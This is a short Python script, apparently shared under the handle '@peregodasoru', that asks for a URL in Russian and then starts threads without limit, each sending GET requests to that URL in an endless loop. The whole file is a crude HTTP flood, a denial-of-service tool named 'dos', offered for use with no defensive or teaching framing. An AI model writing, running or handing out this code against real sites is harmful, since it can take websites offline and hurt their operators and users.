#UPDATE BY @peregodasoru
#UPDATE BY @peregodasoru
#UPDATE BY @peregodasoru
import threading
import requests
link = input('Введите ссылку: ')
def dos():
 while True:
  requests.get(link)
  
while True:
 threading.Thread(target=dos).start()
#UPDATE BY @peregodasoru
#UPDATE BY @peregodasoru
#UPDATE BY @peregodasoru